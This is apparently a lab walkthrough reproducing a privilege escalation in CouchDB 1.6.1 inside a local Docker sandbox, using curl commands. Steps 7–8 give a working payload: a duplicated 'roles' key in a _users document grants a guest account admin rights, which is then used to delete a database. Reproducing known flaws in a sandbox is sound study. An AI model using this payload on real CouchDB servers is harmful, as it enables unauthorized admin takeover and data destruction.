# Steps to exploit

1. Run docker image:  
    ```docker container run -d --name couchdb-sandbox -p 5984:5984 couchdb:1.6.1```
2. Check sure the CouchDB instance is launched and working  
    ```curl -X GET http://localhost:5984```
3. Query: All databases in the instance  
   ```curl -X GET http://localhost:5984/_all_dbs```
4. Query: Create an admin account with credentials admin:admin  
   ```curl -X PUT http://localhost:5984/_config/admins/admin -d '"admin"'```
5. Query: Try create a new database named *records*  
    ```curl -X PUT http://localhost:5984/records```  
We cant create because dont have admin account  
6. Query: Create a new database named records with admin authentication  
   ```curl -X PUT http://admin:admin@localhost:5984/records```  
7. Query: Create a new document in _users database  

   ```
   curl -X PUT http://localhost:5984/_users/org.couchdb.user:guest \
    -H "Accept: application/json" \
    -H "Content-Type: application/json" \
    -d '{"name": "guest", "password": "guest", "roles": ["_admin"], "type": "user"}'
    ```

    We cant create an account with admin role
8. Query: Create a new document in _users database with admin role

    ```
   curl -X PUT http://localhost:5984/_users/org.couchdb.user:guest \
    -H "Accept: application/json" \
    -H "Content-Type: application/json" \
    -d '{"name": "guest", "password": "guest", "roles": ["_admin"], "roles": [], "type": "user"}'
    ```  

    we have an admin account now!
9. Query: Create a new database named new_recorDs with guest authentication  
    ```curl -X PUT http://guest:guest@localhost:5984/new_records```  
10. Query: Delete the database named new_records with guest authentication  
    ```curl -X DELETE http://guest:guest@localhost:5984/new_records```